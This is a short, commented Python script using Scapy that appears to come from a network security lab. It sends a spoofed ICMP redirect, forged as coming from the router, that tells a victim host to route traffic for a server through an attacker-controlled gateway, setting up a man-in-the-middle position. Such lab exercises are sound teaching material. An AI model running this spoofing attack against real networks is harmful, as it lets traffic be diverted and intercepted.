# @author: Abdelaziz Neamatallah
# @date: 10.05.2025
#!/usr/bin/python3 -> telling linux to run the script using python3

from scapy.all import * # importing all important functions from scapy library

'''
creates the outer ip packet 
10.9.0.11 -> spoofed router, pretending to be the real router
10.9.0.5 -> victim ip where the spoofed ICMP redirect will be sent
'''
ip = IP(src= '10.9.0.11', dst = '10.9.0.5')

# creating icmp redirect packet type = 5, 
# code = 1 means host redirect as explained before
icmp = ICMP (type=5, code=1)

# sets the gateway as the mallicious router
# tells the victim to send traffic to this ip which is the attacker mal router
icmp.gw = '10.9.0.111'

# This is the embedded original ip packer from the victim to the server
# The enclosed IP packet should be the one that triggers the redirect message
ip2 = IP (src = '10.9.0.5', dst = '192.168.60.5')

# finally sending the message
send(ip/icmp/ip2/ICMP()); 

#This packet tells the victim:
#"Hey, for traffic to 192.168.60.5, send it via 10.9.0.111 instead of me."